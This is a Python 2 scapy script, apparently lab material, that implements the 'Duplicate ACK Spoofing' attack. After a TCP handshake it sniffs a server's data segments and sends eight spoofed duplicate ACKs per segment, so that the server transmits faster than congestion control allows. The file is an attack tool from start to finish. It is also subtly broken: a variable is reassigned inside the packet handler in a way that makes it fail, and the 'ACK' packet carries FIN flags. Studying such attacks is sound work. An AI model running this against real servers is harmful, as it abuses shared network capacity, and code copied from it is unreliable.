#!/usr/bin/env python
"""
This file implements the Duplicate ACK Spoofing attack.
"""

import random
import argparse
import time
from scapy.all import *

parser = argparse.ArgumentParser(
    description="Attack a TCP server with the Duplicate ACK Spoofing attack."
)
parser.add_argument("--dport", default=8000, type=int, help="The port to attack.")
parser.add_argument(
    "--sport", default=8000, type=int, help="The port to send the TCP packets from."
)
parser.add_argument(
    "--host", default="127.0.0.1", type=str, help="The IP address to attack."
)
args = parser.parse_args()

FIN = 0x01

if __name__ == "__main__":
    print "Making connection to %s from port %d." % (args.host, args.sport)
    print "Starting three-way handshake..."
    ip_header = IP(
        dst=args.host
    )  # An IP header that will take packets to the target machine.
    seq_no = 12345  # Our starting sequence number (not really used since we don't send data).
    window = 65535  # Advertise a large window size.

    syn = ip_header / TCP(
        window=window, sport=args.sport, dport=args.dport, flags="S"
    )  # Construct a SYN packet.
    synack = sr1(syn)  # Send the SYN packet and receive a SYNACK

    ack = ip_header / TCP(
        window=window,
        sport=args.sport,
        dport=args.dport,
        flags="FA",
        ack=(synack[TCP].seq + 1),
        seq=(synack[TCP].ack),
    )  # ACK the SYNACK

    max_ack = synack[TCP].seq + 1

    socket = conf.L2socket(iface="client-eth0")

    def handle_packet(pkt):
        data = pkt.payload.payload

        if IP not in pkt:
            return
        if TCP not in pkt:
            return
        if pkt[IP].src != args.host:
            return
        if data.sport != args.dport:
            return
        if data.dport != args.sport:
            return
        if not data.payload or len(data.payload) == 0:
            return

        add = 0
        DUPLICATION_FACTOR = 8

        if pkt.flags & FIN:
            add = 1
            DUPLICATION_FACTOR = 1

        final_ack = data.seq + len(data.payload) + add

        if max_ack > final_ack:
            return

        max_ack = final_ack

        for i in xrange(DUPLICATION_FACTOR):
            socket.send(
                Ether()
                / ip_header
                / TCP(
                    window=window,
                    sport=args.sport,
                    dport=args.dport,
                    flags="A",
                    ack=final_ack,
                    seq=(pkt[TCP].ack),
                )
            )

    socket.send(Ether() / ack)
    sniff(iface="client-eth0", filter="tcp and ip", prn=handle_packet, timeout=8)
